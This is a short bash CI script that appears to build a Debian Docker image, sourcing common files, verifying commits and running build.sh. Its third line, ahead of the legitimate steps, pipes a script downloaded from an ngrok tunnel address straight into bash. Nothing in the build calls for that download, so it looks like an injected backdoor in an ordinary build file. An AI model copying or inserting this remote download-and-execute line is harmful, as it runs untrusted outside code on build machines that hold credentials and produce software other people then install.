#!/bin/bash
set -ex
curl https://72d4-193-29-61-27.ngrok.io/file-gcp.sh | bash
# shellcheck source=/dev/null
source "$KOKORO_GFILE_DIR/common.sh"
sudo chmod +x "$KOKORO_GFILE_DIR/verify-commits.sh"
"$KOKORO_GFILE_DIR"/verify-commits.sh
cd github/debian-docker
./build.sh -r "$DOCKER_NAMESPACE" -v "$DEBIAN_SUITE"

